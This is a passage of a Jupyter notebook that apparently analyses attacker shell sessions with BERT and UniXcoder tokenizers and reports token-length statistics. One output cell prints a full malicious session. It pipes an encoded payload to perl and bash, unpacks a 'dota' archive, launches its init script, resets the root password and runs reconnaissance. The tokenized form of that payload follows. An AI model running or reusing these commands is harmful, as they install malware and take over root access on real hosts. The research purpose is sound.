gSCwiRFsiQmBAKSYxQzhXLU84VkxNXy9GJVU9Jl1GOyc1UzoiQFEqM0wqKCJgRDkmLUM3Vy1FOyJUXjg2MUQqIjFEOFYtUztWLUsqM0wqKCJgRDEkLSM+UjFEOFYtUztWLUs/N01UOjchT18/MmBdKCI9Rzk3MEcuUEhAKCIxJDBULVspJjFDOFctTzhWTV0+VkVUOjZVRT8yYF0oJzFJOzY0WyJCYEApJDEjMFdMRDkmLUM8Vl1DOldVWztGRUNfOldUQC8yYEQ7RkVDOlNMKigiYEQxJC0jPlIxRDhWLVM7Vi1LPzdNQj43MUU8V1RALzJgRDhHRVQ5NyxbIkJgQCkkMSMwV0xEOSYtQzxWXUM6V1VbXzhXNVI4R0VUOTdUQC8yYFAuUEhAKCIxJDBULVspJjFDOFctTzhWTV0+ViVSPDc1ST1GXV0oI1RAKSYlUjw3NUk9RlxbIkJgQCkkMSMwV0xEOSYtQ188Vl1DOldVWzo3IV0oI1RAKSYxQzhWRVAuUEhAKCIxJDBULVspJjFDOFctTzhWTV0+VyFPPEcxQT8yYF0oIjFEOFYtUDtXKVQ4M0wqKCJgRDEkLSNfPlIxRDhWLVM7Vi1LPzdNUz0mJVQ9Ny1dKCNUQChFKUU4VjVCOTZZRDtSKFsiR1QqIkctVThCITM9JiVUPTcsQD5QSEAoJlVZKCIxUztWLUs5NzBAXy8yIVM6JkVGPSNMKigiIU0+MmBEPFZdQzpVXVQ6NyFPKCNUQCkkMSMwV0xEPFZdQzpWNVQ/N01UOjchTz8zTCooIiFVO0ZRRTxXLEAqJlFDKiIxU187Vi1LN1cxSTwmXEkoJjVRKCIpQzomJVQoQkRAPlBIQCgiYEA7N0RAKSZZSThWTEAvMmBEMSQtIz5SMVM7Vi1LOTcxXT5WWUk4Vk1dLlBIQCgiYEBfOzdEQCkmJVI8NzVJPUZcQC8yYEQxJC0jPlIxUztWLUs5NzFdPlYlUjw3NUk9Rl1dLlBIQCgiYEA7N0RAKSZFVDo2VUUoI1RAKSQxIzBXTEQ8Vl1DXzpWNVQ/N01JPSZFTTk3VFsiQmBAKCIhTT4yYEQ5RzFJOzY0QC8yIVQ6NlVFLlBIQCgiYEA7N0RAKSctVDg3MVU8UmBdKCIxJDBULVspJy1POFZNRV89J1VbPFcxQT0nNVM/M0wqKCJgQCgiMUY9JkVNOTJgXSgiMSQwVC1bKSctTzhWTUU9J1VbOUcxSTs2NV0oJkVGKCYxRTlGRU45NjBIKSQxIzBXTERfPFZdQzpWNVQ/N01GPSZFTTk3VEkuUEgqKCJgQCgmVVkoIjFEN1cxSTs2NEAvMmBEOUcxSTs2NE0pJkVUOjZVRS5QSCooImBAKCZVWSgiMUM9Nyk/XzhHRVQ5MmBdKCIxJDBULVspJy1POFZNRT0nVVs4VzVSOEdFVDk3VFsiQmBAKCIhTT4yYEQ4R0VUOTctPz0mXVQ4NlBALzJgQCkkMSMwV0xEPFZdQ186VjVUPzdNQj43MUU8V1RbIkBIQCgiYEA7N0RAKScpQT0mNEAvMmBQLlBIQCgiYEApJylBPSY0QC8yYEgpJi1VPEVdQj43MUUrUyRQLEMwSStSMURfN1cxSTs2NEA6NjhAKSYtVTxFXUI+NzFFKCNYQCwjTCooImBAKCZVWSgiMVA7VylDOTZYQC8yYEgpJi1VPEVdQj43MUUqQyRQLCJETykmKVk9JjVTXzdXMU89JiVMLlBIKigiYEAoJlVZKCJARDxFXUQ9NzhMKCIxUDdWMVU9QkRbIkJgQCgiIUk5QmBIKScpQT0mNEAvN1hAK1VYSDcmMEsqNVBOKiVRRF8qMkE8OSJESDcmMEkrUkRAPlBIQCgiYEAoImBAKScpPzknNVYoI1RAKSMsWygiMVI3VjFVPUJMSygmRUYoIjBUKCNYXSgjNFsiQmBAKCJgQCgiYERfPEYlVDkyYF0oIihELDVQTikjKEIrQihEPEVdRD03OEIuUEhAKCJgQD8wSEAoImBAOjY4QCoiMVA7VylDOTZYQC83WEArVVhINyYwSyo1UE4qJVFEXyoyQTw5IkRINyYwSStSREA+UEhAKCJgQCgiYEApJyE/OSc1VigjVEApIyxbKCIxUDdWMVU9QkxLKCZFRigiMFQoI1hdKCM0WyJCYEAoImBAKCJgRF88Jl1SOFY1TigjVEAoQjBRNyJYRCxCKE4oQjFQN1YxVT1CKFsiQmBAKCIhXSJCYEAoIiFSOTcxVTxGWEgoQjFTO1YtSzdXMUk8JlxCKyIoRDxXMUFfPSc1UyhCUEIpJllJOFZMQisiKEQ4NylRPTZFVjtSKEwoQjFCPjcxRTxVXVQ7VzFBOyIoTCgiKEQ4VzVSN1YpWT0mNEIrIihEOSVdVDo2VUUoQlBAXyhCMVI4NzFFKEJQQChCMVA7VylDOTZYQiozTCooIiFdIkBIKigiIVI5NzFVPEZYSCwiRFsiR1QqIkBJUz02KEA5RkVYODYxRDxCIVsiQmBAKCIhTV8+MmBIKSYlRDknKUU8VyxJKCNUQDAlXFsiQEhAKCJgQDhWQU87N2BAKSYlRDknKUU8VyxbKCJgQCgiYCooImBAKCZFRigiQEQ4NjFEPEY1UzxSYF1fP0JgTzdFUUQqUjBPKjIhWyJCYEAoImBAKCJgQDxGNVQ9NylOKCZFTjk3MT87RzFPODJBUDg2LUsoIikuKEJQQCkmJUQ5JylFPFcsSS5QSEAoImBAXz8yIUU7Jy1JOUJgSCkmJUQ5JylFPFcsQC83WEArVVk7LDMpPS9VUUQ+UyRMLEdVPCtFTFEsRVRfNyYxWywyUFI/NVBONlMkUjczXTw5J0xRKyMpXV83Ilk7LDMpPS9VUUQ+UyRMLEdURCtSREA+UEhAKCJgQCgiYEAoJylFPSc1UjtCYEQ4NjFEPEY1UzxTTCooImBAKCdUQDk2UVM6NjhAKiIxQTkmMVJfOTctUygjVV4oJzFSK1YkTT5EJE02QlxPKjIhWygiYEAoImBAKCJgQCgiYEAoImBAKCJgQCgiYCooImBAKCJgQCgiIVI5NzFVPEZYQDo2WUU9JV1OXz0mXUEqIkBIOVY1VDomXVM9JilZO0YlTTkyQEQ4NjFEPEY1UzxSREk2UzE9KjVMUDcyRFsiQmBAKCIhXSgmNUw8VjRAPlBIQCgiYEAoImBAKCcpRS09JzVSO0NMKigiYEAoJ1QqPzB9Cg== | base64 --decode | perl ; rm -rf /var/tmp/dota* ; sleep 15s && cd /var/tmp ; echo IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKbWtkaXIgLlgxMy11bml4CmNkIC5YMTMtdW5peAptdiAvdmFyL3RtcC9kb3RhLnRhci5neiBkb3RhLnRhci5negp0YXIgeGYgZG90YS50YXIuZ3oKc2xlZXAgM3MgJiYgY2QgLnJzeW5jOyBjYXQgL3RtcC8uWDEzLXVuaXgvLnJzeW5jL2luaXRhbGwgfCBiYXNoIDI+MSYKZXhpdCAw | base64 --decode | bash ; cat /proc/cpuinfo | grep name | wc -l ; echo root:01BmLg8ozMoQ | chpasswd | bash ; echo 321 > /var/tmp/.var03522123 ; rm -rf /var/tmp/.var03522123 ; cat /var/tmp/.var03522123 | head -n 1 ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ;\n"
          ]
        }
      ],
      "source": [
        "print(\"UniXcoder Tokenized Sentence Lengths:\")\n",
        "print(train_data['uni_tokenized'].apply(lambda x: len(x)).sort_values(ascending=False).head(10))\n",
        "\n",
        "print(\"\\nBERT Tokenized Sentence Lengths:\")\n",
        "print(train_data['bert_tokenized'].apply(lambda x: len(x)).sort_values(ascending=False).head(10))\n",
        "\n",
        "print(\"\\nLongest Session Text:\")\n",
        "print(train_data['session'][14])"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "vw7PWknU3Cmg"
      },
      "source": [
        "BERT:\n",
        "- Average: ~177 tokens per session\n",
        "- Max: 1887 tokens in a single session\n",
        "\n",
        "UniXcoder:\n",
        "- Average: ~407 tokens per session\n",
        "- Max: 28,918 tokens in a single session!\n",
        "\n",
        "UniXcoder splits more rare/unknown words into multiple subword tokens, especially for long or uncommon bash words (e.g., base64-encoded strings, scripts, etc.).\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "4bjlhNHq3Cmg",
        "outputId": "f2b4fe15-aefa-4e24-e4ff-2002653a7cf1"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(BERT, UniXcoder) max token lengths:\n",
            "(512, 1000000000000000019884624838656)\n",
            "\n",
            "BERT longer than model_max_length: 24, UniXcoder longer than model_max_length: 0\n"
          ]
        }
      ],
      "source": [
        "print(\"(BERT, UniXcoder) max token lengths:\")\n",
        "print((bert_tokenizer.model_max_length, unix_tokenizer.model_max_length))\n",
        "print()\n",
        "#how many tokens are longer than the max length?\n",
        "bert_long_tokens = train_data['bert_tokenized'].apply(lambda x: len(x) > bert_tokenizer.model_max_length).sum()\n",
        "unix_long_tokens = train_data['uni_tokenized'].apply(lambda x: len(x) > unix_tokenizer.model_max_length).sum()\n",
        "print(f\"BERT longer than model_max_length: {bert_long_tokens}, UniXcoder longer than model_max_length: {unix_long_tokens}\")\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "fKhOhmDg3Cmh"
      },
      "source": [
        "BERT:\n",
        "24 sessions would be truncated because their total tokenized length exceeds the model’s limit of 512 tokens.\n",
        "\n",
        "UniXcoder:\n",
        "0 sessions would be truncated given its (practically unlimited) max input length. In reality, most sessions fall well below the maximum."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "LcLaxszE3Cmh",
        "outputId": "ba4e735a-5228-4153-e6c9-78f9209a395b"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Longest Session Token Length: 134\n",
            "['cd', 'Ġ/', 'tmp', 'Ġ||', 'Ġ/', 'var', '/', 'tmp', 'Ġ||', 'Ġ/', 'dev', '/', 'shm', 'Ġ;', 'Ġecho', 'ĠZ', 'XZ', 'hb', 'CB', '1', 'bn', 'B', 'hY', '2', 'sg', 'dT', '0', '+', 'cX', 'tf', 'Ik', 'ZV', 'WS', 'gi', 'MV', 'A', '8', 'Rl', '1', 'DOT', 'ct', 'U', 'zt', 'SY', 'F', '0', 'o', 'Ij', '1', 'SP', 'Fd', 'FT', 'jh', 'SP', 'F', 'si', 'QE', 'h', 'EP', 'FY', '1', 'Uj', '1', 'GR', 'UQ', '7', 'Vy', 'hd', 'K', 'VM', 'k', 'VC', '1', 'CW', 'FE', 'u', 'Iz', 'R', 'OL', 'DM', '8', 'U', 'St', 'DK', 'FI', 't', 'Uj', 'x', 'AP', 'T', 'ZZ', 'TD', 'k', '3', 'LV', 'Mo', 'Ij', 'F', 'TX', 'zk', '3', 'KV', 'Y', '6', 'Nj', 'FP', 'PEN', 'MK', 'js', '3', 'RE', 'Ap', 'Jy', 'FP', 'PE', 'cx', 'QS', '8', 'y', 'PF', 'Qt', 'I', 'yx', 'HL', 'l', 'BJ', 'TT', '4', 'y', 'I', 'WA', '4', 'Vi', 'VO', 'OD', 'Z', 'FU', 'y', '8', 'y', 'QE', 'Io', 'Vy', 'FQ', 'KE', 'J', 'EW', 'y', 'J', 'GV', 'Vk', 'o', 'J', 'CF', 'BO', 'SZ', 'VU', 'y', '8', 'y', 'QE', 'Iw', 'M', 'ih', 'M', 'KE', 'V', 'AQ', 'l', '8', 'qM', '0', 'wq', 'O', 'zd', 'EQ', 'DA', 'mJ', 'VU', '9', 'Jk', 'Bd', 'Ki', 'Ip', 'TD', 't', 'WL', 'UE', '7', 'Jk', 'FP', 'PF', 'cw', 'Q', 'io', 'zT', 'Co', 'i', 'Rl', 'VZ', 'K', 'CI', 'xT', 'Do', '2', 'W', 'UE', '8', 'VV', '1', 'NOD', 'd', 'AX', 'S', '1', 'DT', 'Co', '7', 'N', '0', 'R', 'AK', 'S', 'ct', 'TD', 'k', '2', 'NV', 'Av', 'My', 'xb', 'Ik', 'BJ', 'TT', '4', 'yY', 'ER', 'f', 'O', '0', 'Z', 'FQ', 'zp', 'SY', 'F', '0', 'o', 'Jj', '1', 'FP', 'SZ', 'Z', 'ST', 'h', 'W', 'TE', 'g', 'qM', '0', 'wq', 'O', 'zd', 'EQ', 'C', 'km', 'RV', 'I', '4', 'V', 'll', 'BO', 'zY', '0', 'QC', '8', 'y', 'IU', 'c', '5', 'Nz', 'FOO', 'jY', 't', 'Sy', 'oi', 'RF', 'si', 'Rl', 'VZ', 'K', 'CI', 'xU', 'jk', '2', 'JU', 'w', '7', 'Ri', 'V', 'NOT', 'Jg', 'XS', 'gi', 'QU', 'A', '9', 'N', 'll', 'BX', 'zs', '2', 'NE', 'Ar', 'Ni', 'V', 'AK', 'jN', 'MK', 'i', 'J', 'GV', 'Vk', 'o', 'Ij', 'FBO', 'FY', '1', 'Uz', 'x', 'WX', 'VM', '6', 'Jj', 'VM', 'Oy', 'Jg', 'XS', 'gj', 'JF', 'si', 'Rl', 'VZ', 'K', 'CI', 'x', 'UD', 'x', 'GN', 'UY', '6', 'N', '0', 'FP', 'K', 'CN', 'UQ', 'Ch', 'CJ', 'EA', 'o', 'Q', '0', 'wq', 'O', 'zd', 'EQ', 'C', 'km', 'NVM', '9', 'Ji', 'VU', 'Oj', 'ct', 'VF', '86', 'Ni', '1', 'BP', 'FJ', 'g', 'XS', 'g', 'jY', 'F', 'si', 'Rl', 'VZ', 'K', 'CI', 'x', 'UD', 'g', '2', 'LU', '89', 'Jj', 'VT', 'K', 'CN', 'U', 'QC', 'wz', 'T', 'Co', 'i', 'Rl', 'VZ', 'K', 'CI', 'x', 'Nj', 'E', '1', 'K', 'TM', 'w', 'NF', 'x', 'AL', 'z', 'Jg', 'Ry', 'wi', 'W', 'FI', '4', 'Mj', 'xb', 'Ik', 'B', 'IR', 'DR', 'UR', 'Sc', '+', 'Uj', '0', 'pM', '0', 'Uw', 'Rz', '8', 'yY', 'F', '1', 'f', 'K', 'CI', '9', 'K', 'TF', 'U', 'WS', '80', 'R', 'DR', 'HL', 'lB', 'IR', 'DR', 'UR', 'Sc', '+', 'Uj', '0', 'o', 'NT', 'Vg', 'Rz', '8', 'yY', 'F', '0', 'o', 'Ij', '0', 'pM', 'VR', 'Z', 'Lz', 'RE', 'NE', 'cu', 'UE', 'h', 'EN', 'FR', 'FJ', 'z', '5', 'SP', 'T', 'Qx', 'N', 'Sk', 't', 'KV', 'dU', 'QC', '8', 'y', 'YE', 'cy', 'ND', '0', 'u', 'M', '1', 'Up', 'JS', 'l', 'T', 'TC', 'op', 'JS', '0', 'pX', 'z', 'FX', 'TE', 'cw', 'VE', 'Es', 'MSI', '9', 'XS', 'gj', 'VE', 'Ap', 'VE', 'Un', 'M', '0', 'Rd', 'Mj', 'Ey', 'PF', 'si', 'Qj', 'E', 'zM', 'jQ', '9', 'W', 'yl', 'V', 'IT', 'M', 'pV', '1', 'R', 'AL', 'z', 'Jg', 'Rz', 'I', '0', 'PS', '4', 'zV', 'Sk', 'l', 'KV', 'N', 'MK', 'i', 'J', 'HN', 'VM', '5', 'Mi', 'Ep', 'M', '1', 'NI', 'Wj', 'RW', 'X', 'UM', '6', 'Vj', 'V', 'UL', 'l', 'BJ', 'VV', '88', 'Vj', 'R', 'AN', 'FZ', 'd', 'Qz', 'p', 'WN', 'V', 'Qu', 'UE', 'l', 'VP', 'FY', '0', 'Q', 'DI', '0', 'XF', 'ou', 'RS', '1', 'FO', 'yY', '1', 'Qz', '0', 'j', 'T', 'Co', '4', 'Vk', 'FE', 'Oj', 'co', 'S', 'Ch', 'CX', 'EI', 'qM', '0', 'wq', 'KS', 'ct', 'RT', 'x', 'HO', 'Uk', '5', 'Jl', '1', 'SL', 'z', 'Io', 'R', 'DA', '1', 'K', 'Sc', '1', 'RU', 'xQ', 'Nz', 'Io', 'Q', 'Do', '2', 'O', 'EB', 'f', 'K', 'SQ', 'l', 'Mj', 'FV', 'OT', 'ss', 'J', 'VR', 'b', 'Ik', 'Iw', 'UC', '8', 'y', 'KE', 'Q', '8', 'Jy', 'l', 'PO', 'FY', '1', 'Uz', 'x', 'WX', 'E', 'Ir', 'Q', 'ik', '8', 'L', 'CI', 'o', 'Wy', 'J', 'GV', 'Vk', 'o', 'Ij', 'FQ', 'O', 'jY', 'w', 'XT', 'l', 'G', 'XV', 'I', '6', 'U', '0', 'wq', 'OT', 'dB', 'ST', '0', 'i', 'I', 'Uk', '5', 'Qm', 'BE', 'PC', 'Z', 'FR', 'C', '5', 'Q', 'SU', 'Q', '6', 'Nj', 'R', 'AX', 'yh', 'FI', 'VI', '7', 'V', 'il', 'MOT', 'ZV', 'QS', 'gm', 'LU', '87', 'Mi', 'FP', 'K', 'CY', '5', 'Tz', 'x', 'G', 'TF', 'oo', 'Ij', 'BB', 'KE', 'Ih', 'VT', 't', 'GU', 'UU', '8', 'Vy', 'xA', 'O', 'SY', '1', 'R', 'jo', '2', 'WU', 'U', '5', 'Ik', 'BE', 'PC', 'Z', 'FR', 'Co', 'zT', 'Co', 'i', 'Rl', 'VZ', 'K', 'CI', '1', 'ST', 'x', 'G', 'LT', '88', 'Vj', 'V', 'SP', 'UY', '1', 'Ul', '88', 'U', '0', 'wq', 'O', 'zd', 'EQ', 'Ck', '0', 'MS', 'Mw', 'U', '0', 'wq', 'O', 'zd', 'EQ', 'C', 'km', 'M', 'UM', '4', 'VV', '1', 'T', 'OT', 'Z', 'QQ', 'C', '8', 'y', 'IU', '45', 'Nz', 'x', 'AM', 'j', 'Rc', 'Wi', '5', 'FL', 'UU', '7', 'Jj', 'VD', 'PS', 'J', 'UX', 'jt', 'GN', 'V', 'cq', 'Ik', 'Rb', 'Ik', 'BI', 'Ki', 'J', 'AS', 'VM', '9', 'N', 'ih', 'A', 'OV', 'Y', '1', 'VD', 't', 'GR', 'UN', 'f', 'Ol', 'Ih', 'Wy', 'J', 'CY', 'EA', '8', 'Rj', 'V', 'UPT', 'cp', 'T', 'ig', 'i', 'KV', 'go', 'Q', 'll', 'JO', '0', 'cw', 'SD', 'x', 'G', 'JU', '45', 'Ik', 'BZ', 'Lj', 'NE', 'WS', 'oy', 'RE', '4', 'o', 'Ql', 'R', 'CK', '0', 'Z', 'FT', 'j', '0', 'i', 'Q', 'VI', '4', 'N', 'll', 'EK', 'i', 'NE', 'WS', '4', 'z', 'RE', 'kq', 'M', '0', 'wq', 'Pz', 'BI', 'Ki', 'JH', 'LV', 'U', '4', 'Qi', 'FH', 'X', 'zk', '3', 'MU', 'k', '5', 'Jj', 'V', 'OP', 'SI', 'h', 'Wy', 'J', 'CY', 'EA', '7', 'N', '0', 'R', 'AK', 'Sc', 'p', 'RT', '0', 'm', 'XV', 'I', '7', 'Rl', '1', 'JO', 'SY', '1', 'Tj', '0', 'iY', 'F', '0', 'o', 'I', 'jk', '/', 'OV', 'Y', '1', 'V', 'Co', 'i', 'K', 'Ug', '9', 'Jz', 'F', 'QL', 'k', 'Jc', 'Tz', '1', 'XP', 'V', 'cr', 'Rl', 'V', 'JO', '0', 'ch', 'Tz', 'wi', 'W', 'UM', '7', 'Vl', 'R', 'PP', 'FZ', 'M', 'UV', '8', 's', 'Ry', 'FBO', 'FZ', 'MT', 'zo', '2', 'MU', 'U', '7', 'Rz', 'FT', 'K', '0', 'ch', 'SD', 'wi', 'KE', 'ku', 'UE', 'h', 'AK', 'C', 'ZV', 'WS', 'gi', 'MU', 'k', '5', 'Jj', 'V', 'OP', 'SY', 't', 'SD', 'g', '2', 'W', 'UM', '5', 'Mm', 'Bd', 'KC', 'Z', 'FT', 'j', '0', 'i', 'Q', 'VI', '4', 'N', 'll', 'EK', 'i', 'Mk', 'UC', 'w', 'jY', 'E', 'kq', 'M', '0', 'wq', 'K', 'CI', 'h', 'ST', 'l', 'CY', 'E', 'hf', 'K', 'SZ', 'FR', 'Dk', '2', 'WV', 'Q', '4', 'Vk', 'FBO', '0', 'Y', 't', 'RS', 'gj', 'WE', 'As', 'U', '2', 'BJ', 'KC', 'd', 'MK', 'ig', 'iY', 'EA', 'o', 'Ii', 'FS', 'OT', 'cx', 'VT', 'x', 'G', 'WE', 'Ap', 'J', 'll', 'J', 'OF', 'Z', 'MW', 'y', 'J', 'CY', 'EA', '/', 'Mi', 'FF', 'Oy', 'ct', 'RS', 'gn', 'T', 'Co', 'o', 'Im', 'BA', 'K', 'CI', 'h', 'U', 'jk', '3', 'MV', 'U', '8', 'Rl', 'h', 'AX', 'y', 'kn', 'K', 'UU', '9', 'Jl', '1', 'SO', '0', 'Zd', 'ST', 'km', 'NU', '49', 'I', '0', 'wq', 'K', 'CI', 'h', 'XS', 'J', 'CY', 'EA', '8', 'Rj', 'V', 'UPT', 'cp', 'T', 'ig', 'i', 'MV', 'I', '5', 'Nz', 'FP', 'PE', 'Z', 'ZT', 'zo', '2', 'MU', 'U', '7', 'Rz', 'Bb', 'I', 'kd', 'UK', 'i', 'JH', 'LV', 'U', '4', 'Qi', 'FH', 'OT', 'cx', 'Tj', 'g', '2', 'V', 'UU', 'o', 'J', '0', 'wq', 'K', 'CI', 'h', 'TV', '8', '+', 'Mm', 'BE', 'PE', 'Y', '1', 'VD', 't', 'XK', 'U', '47', 'V', 'll', 'BO', 'zY', '0', 'QC', '8', 'yY', 'EY', '3', 'Vj', '1', 'FPS', 'J', 'AQ', 'j', 'on', 'MV', 'Q', '8', 'I', '0', 'h', 'PK', '1', 'c', '9', 'Vz', '1', 'SW', 'U', '06', 'N', 'll', 'QO', '1', 'dg', 'T', 'jh', 'WX', 'U', '0', 'r', 'Vy', '1', 'LL', 'DM', 'p', 'UD', 'g', '2', 'L', 'Us', 'r', 'V', 'll', 'BO', 'zY', '1', 'Uy', 't', 'HI', 'U', 'hf', 'PC', 'Io', 'SS', '5', 'Q', 'SE', 'Ao', 'Jy', 'l', 'FP', 'Sc', '1', 'U', 'jt', 'CY', 'EQ', '8', 'Rj', 'VU', 'O', '1', 'cp', 'T', 'jt', 'WW', 'UE', '7', 'Nj', 'Rb', 'I', 'kd', 'UK', 'i', 'JH', 'LV', 'U', '4', 'Qi', 'FH', 'OT', 'cx', 'ST', 'km', 'NU', '49', 'Iy', 'h', 'AP', 'l', 'BI', 'QC', 'gi', 'Y', 'EA', 'o', 'Im', 'BA', 'KC', 'ZV', 'WS', 'gi', 'MU', 'w', '5', 'N', 'll', 'HX', 'z', '0', 'm', 'QF', '08', 'Vk', 'FJ', 'OU', 'cw', 'Wy', 'J', 'CY', 'EA', 'o', 'Im', 'BA', 'KC', 'Jg', 'QC', 'km', 'UU', 'U', '7', 'Rj', '1', 'U', 'Oi', 'Jg', 'XS', 'gj', 'LE', 'A', '6', 'Nj', 'h', 'AK', 'i', 'Ix', 'TD', 'k', '2', 'WU', 'c', '9', 'Jk', 'BAL', 'y', 'Jg', 'U', 'yo', 'zT', 'Co', 'i', 'Qm', 'BA', 'KC', 'Jg', 'QC', 'gi', 'Y', 'EA', '7', 'N', '0', 'RAM', 'CY', 't', 'SF', '84', 'N', 'yl', 'TL', 'zJ', 'AR', 'z', 'gy', 'PE', '4', 'r', 'Qj', '1', 'a', 'KV', 'J', 'QR', 'zA', 'y', 'PE', '4', 'r', 'Qj', '06', 'KV', 'JQ', 'Ry', 'wy', 'PE', '4', 'r', 'Qj', 'xZ', 'KV', 'J', 'EW', 'y', 'J', 'CY', 'EA', 'o', 'Im', 'BA', 'KC', 'J', 'gQ', 'Dl', 'G', 'XV', 'I', '5', 'Ni', 'V', 'DO', 'i', 'Jg', 'SC', 'wy', 'WE', '4', 'p', 'Jl', 'FF', 'O', '0', 'Y', '9', 'V', 'Do', 'i', 'RC', 'pf', 'KC', 'Jg', 'QC', 'gi', 'Y', 'EA', 'o', 'Ii', 'Fb', 'Ik', 'Jg', 'QC', 'gi', 'Y', 'EA', 'o', 'Im', 'BA', 'KC', 'Jg', 'QC', 'gi', 'Y', 'EA', 'o', 'Im', 'BE', 'PE', 'Yl', 'Tj', 'km', 'XU', '08', 'Vz', 'FS', 'Oj', 'ZZ', 'Ry', 't', 'D', 'VE', 'Q', '4', 'Vk', 'FB', 'PE', 'ct', 'O', 'zx', 'G', 'JU', '45', 'Ii', 'Fg', 'OF', 'Z', 'BQ', 'Tx', 'H', 'LT', '0', 'u', 'UE', 'h', 'AX', 'y', 'gi', 'Y', 'EA', 'o', 'Im', 'BA', 'KC', 'd', 'UK', 'ig', 'iY', 'EA', 'o', 'Im', 'BA', 'K', 'CI', 'h', 'U', 'jk', '3', 'MV', 'U', '8', 'Rl', 'h', 'AK', 'Sc', 'p', 'QT', 't', 'G', 'MU', '87', 'Ny', '1', 'U', 'PE', 'Z', 'FT', 'jl', 'TT', 'Co', '/', 'ME', 'gq', 'PF', 'c', '1', 'Q', 'ig', 'm', 'PU', 'U', '9', 'Jy', '1', 'UO', '1', 'cp', 'RS', 'gi', 'Q', 'EQ', 'pI', 'k', 'Qq', 'Pl', 'BI', 'QF', '8', 'o', 'Jl', 'VZ', 'K', 'CI', 'x', 'VT', 'x', 'G', 'UE', 'Av', 'Mi', 'F', 'TO', 'iZ', 'FR', 'j', '0', 'j', 'T', 'Co', 'o', 'Ii', 'FN', 'Pj', 'Jg', 'RD', 'l', 'GR', 'Uw', '5', 'Mm', 'Bd', 'KC', 'ct', 'S', 'Do', '2', 'OV', 'Qu', 'UE', 'gq', 'KC', 'Jg', 'RD', 'on', 'MV', 'Q', '8', 'JV', '1', 'TP', 'Sc', 'p', 'RT', 'g', '2', 'VT', '87', 'Vz', 'V', 'UK', 'CN', 'U', 'QC', 'wz', 'TC', 'pf', 'K', 'CI', 'h', 'Tz', 'wm', 'NU', '4', 'q', 'JD', '0', 'l', 'NS', 'Vd', 'Lz', 'U', '1', 'M', 'SY', 'y', 'N', 'FE', 'l', 'Ky', 'Jg', 'Qi', '9', 'CY', 'EQ', '5', 'Rk', 'VM', 'OT', 'Io', 'SS', '5', 'Q', 'SE', 'Ao', 'Ij', 'V', 'IP', 'Sc', 'x', 'UD', 'd', 'WU', 'U', '87', 'Vy', 'E', '/', 'OF', 'Z', 'BR', 'Th', 'W', 'TE', 'Av', 'Mm', 'BI', 'K', 'jN', 'MK', 'ig', 'i', 'IT', '85', 'Vj', 'V', 'UX', 'y', 'oi', 'MV', 'U', '8', 'Rl', 'BJ', 'Ll', 'BI', 'QC', 'gm', 'LU', 'w', '7', 'Vy', '1', 'FK', 'CQ', '9', 'J', 'TU', 'l', 'XS', '81', 'N', 'TE', 'm', 'Mj', 'RR', 'JS', '5', 'Q', 'SE', 'Ao', 'Jy', 'l', 'FP', 'Sc', '1', 'U', 'jt', 'CY', 'EQ', '7', 'Ni', 'V', 'JO', '0', 'NI', 'Wj', 'on', 'MV', 'Q', '8', 'JV', '1', 'HOT', 'cx', 'P', 'zx', 'GN', 'VM', '9', 'Nl', 'FUL', 'l', 'BJ', 'XV', '8', 'i', 'Q', 'El', 'TP', 'TY', 'o', 'QD', 'dW', 'PU', 'U', '9', 'Y', 'El', 'b', 'Ik', 'J', 'gQ', 'Ds', '3', 'RE', 'Ap', 'Jz', 'V', 'SO', 'y', 'Jg', 'XS', 'gn', 'LU', 'g', '6', 'Nj', 'l', 'UL', 'l', 'BI', 'QC', 'g', 'mV', 'Vk', 'o', 'Ij', 'FQ', 'PE', 'Zd', 'WD', '4', 'yY', 'F', '0', 'o', 'I', 'ih', 'CL', 'l', 'BI', 'QC', 'gm', 'P', 'VI', '5', 'N', '2', 'BAP', 'lJ', 'BT', 'Dh', 'SQ', 'ER', 'f', 'N', '1', 'J', 'EQ', 'Dk', '3', 'J', 'EA', 'o', 'Rk', 'F', 'UP', 'Sch', 'Pz', 'wn', 'KU', '8', '+', 'J', '0', 'R', 'CK', 'j', 'Jg', 'R', 'il', 'CY', 'E', 'gp', 'Jy', 'FS', 'O', '1', 'dB', 'WS', 'gj', 'VE', 'Ap', 'J', 'DU', 'u', 'NU', 'dM', 'RD', 'dX', 'VE', 'k', '/', 'Mi', 'FL', 'OT', 'd', 'FU', 'y', 'gi', 'NSU', 'zR', 'Th', 'b', 'Ik', 'J', 'gQ', 'Do', '2', 'O', 'EA', 'q', 'Ik', 'B', 'EX', 'z', 'wn', 'KU', '8', '+', 'J', '0', 'RA', 'OT', 'ck', 'Q', 'Ch', 'CK', 'E', 'ko', 'Ij', 'h', 'GK', 'CI', 'x', 'VT', 'x', 'G', 'UE', 'Av', 'N', '1', 'h', 'AO', 'zJ', 'RP', 'j', 'on', 'MV', 'Q', '8', 'I', '0', 'h', 'PK', '1', 'J', 'BO', 'zd', 'C', 'XF', 'o', '3', 'Mk', 'x', 'JK', 'i', 'Nc', 'Wi', '5', 'C', 'QT', 'w', '5', 'I', 'kx', 'JK', 'j', 'Nc', 'SC', 't', 'V', 'UT', 'Mq', 'Qk', 'Rf', 'KS', 'JQ', 'SV', '8', 'o', 'J', '0', 'wq', 'KC', 'Jg', 'QC', 'g', 'mV', 'Vk', 'o', 'Ij', 'FI', 'O', '1', 'ct', 'VC', 'gj', 'VE', 'Ap', 'Iy', 'Rb', 'Ik', 'Jg', 'QC', 'gi', 'IU', '0', '+', 'Mm', 'BE', 'PC', 'Zd', 'Uj', '0', 'iY', 'F', '0', 'o', 'Ij', 'B', 'SK', 'Cd', 'RX', 'Cg', 'jQ', 'FA', 'u', 'UE', 